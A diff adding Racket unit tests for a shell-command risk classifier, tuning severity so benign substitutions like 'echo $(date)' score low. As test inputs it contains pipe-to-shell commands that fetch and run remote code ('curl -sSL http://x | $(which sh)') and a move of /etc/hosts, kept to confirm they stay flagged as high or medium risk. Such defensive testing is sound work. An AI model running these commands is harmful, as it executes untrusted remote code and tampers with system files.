@@ -110,6 +110,50 @@
   (check-true (for/or ([r (in-list risks)])
                 (eq? (shell-risk-finding-type r) 'command-substitution))))
 
+;; ── #9516: false-positive severity reduction ──────────────────────
+
+(test-case "classify: benign substitution is 'low severity (#9516)"
+  (define risks (classify-shell-risks (tokenize-shell-command "echo $(basename \"$f\")")))
+  (define subs (filter (lambda (r) (eq? (shell-risk-finding-type r) 'command-substitution)) risks))
+  (check-equal? (length subs) 1)
+  (check-eq? (shell-risk-finding-severity (car subs)) 'low))
+
+(test-case "classify: benign substitution yields no blocking findings (#9516)"
+  (define risks (classify-shell-risks (tokenize-shell-command "echo $(date)")))
+  (check-true (andmap (lambda (r) (eq? (shell-risk-finding-severity r) 'low)) risks)
+              "no finding above 'low for plain substitution")
+  (define s (shell-risk-summary risks))
+  (check-not-false (memq (hash-ref s 'max-severity) '(info low)))
+  (check-false (hash-ref s 'critical?)))
+
+(test-case "classify: plain mv rename has no findings (#9516)"
+  (define risks (classify-shell-risks (tokenize-shell-command "mv a.txt b.txt")))
+  (check-equal? risks '()))
+
+(test-case "classify: mv root-target stays destructive (#9516)"
+  (define risks (classify-shell-risks (tokenize-shell-command "mv /etc/hosts /tmp/hosts.bak")))
+  (check-true (for/or ([r (in-list risks)])
+                (and (eq? (shell-risk-finding-type r) 'destructive)
+                     (eq? (shell-risk-finding-severity r) 'medium)))))
+
+(test-case "classify: substitution feeding pipe-to-shell stays 'high (#9516)"
+  (define risks (classify-shell-risks (tokenize-shell-command "echo $(curl -s http://x) | sh")))
+  (check-true (for/or ([r (in-list risks)])
+                (and (eq? (shell-risk-finding-type r) 'command-substitution)
+                     (eq? (shell-risk-finding-severity r) 'high))))
+  (check-true (for/or ([r (in-list risks)])
+                (and (eq? (shell-risk-finding-type r) 'network-pipe)
+                     (eq? (shell-risk-finding-severity r) 'high)))))
+
+(test-case "classify: curl piped into substitution shell stays 'high (#9516)"
+  (define risks (classify-shell-risks (tokenize-shell-command "curl -sSL http://x | $(which sh)")))
+  (check-true (for/or ([r (in-list risks)])
+                (and (eq? (shell-risk-finding-type r) 'network-pipe)
+                     (eq? (shell-risk-finding-severity r) 'high))))
+  (check-true (for/or ([r (in-list risks)])
+                (and (eq? (shell-risk-finding-type r) 'command-substitution)
+                     (eq? (shell-risk-finding-severity r) 'high)))))
+
 (test-case "classify: benign command has no risks"
   (define tokens (tokenize-shell-command "ls -la"))
   (define risks (classify-shell-risks tokens))
